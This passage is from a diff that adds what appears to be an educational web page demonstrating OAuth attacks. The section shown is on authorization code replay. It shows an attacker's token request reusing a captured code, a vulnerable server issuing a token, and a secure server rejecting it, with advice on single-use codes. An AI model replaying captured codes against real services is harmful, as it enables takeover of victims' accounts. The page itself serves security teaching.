+# Captures: https://app.com/callback?code=AUTH_CODE_abc123
+
+# Step 2: Attacker presents the same code again:
+POST /token
+  code=AUTH_CODE_abc123    ← used before by legitimate user
+  client_id=APP
+  client_secret=SECRET
+  redirect_uri=https://app.com/callback
+  grant_type=authorization_code`,
+    flow:`# Vulnerable server (code not invalidated after first use):
+HTTP 200 OK
+{
+  "access_token": "NEW_TOKEN_FOR_VICTIM",
+  "id_token": "eyJhbGciOiJSUzI1NiJ9...",
+  "scope": "openid email",
+  "expires_in": 3600
+}
+
+# Code was reused successfully!
+# Attacker gets a valid access token for the victim's account.
+
+# Secure server (code invalidated after first use):
+HTTP 400 Bad Request
+{"error": "invalid_grant",
+ "error_description": "Authorization code already used"}`,
+    verdict:'<strong>Authorization code replay!</strong> The server accepted the same auth code twice. Auth codes must be single-use and short-lived (60 seconds per RFC 6749). If a code is used twice, it should also invalidate any tokens already issued for it — this indicates a possible interception attack.'
+  }
+};
+
+function runDemo(){
+  const k=document.getElementById('oauth-select').value;
+  const d=DEMOS[k];
+  document.getElementById('req-out').innerHTML='<span style="color:#fbbf24">'+d.req+'</span>';
+  document.getElementById('flow-out').innerHTML='<span style="color:#f87171">'+d.flow+'</span>';
+  document.getElementById('impact-out').innerHTML='<span style="color:#f87171">'+d.impact+'</span>';
+  const v=document.getElementById('verdict');
+  v.className='result-box r-red';
+  v.innerHTML=d.verdict;
+}
+runDemo();
+</script>
+</body>
+</html>
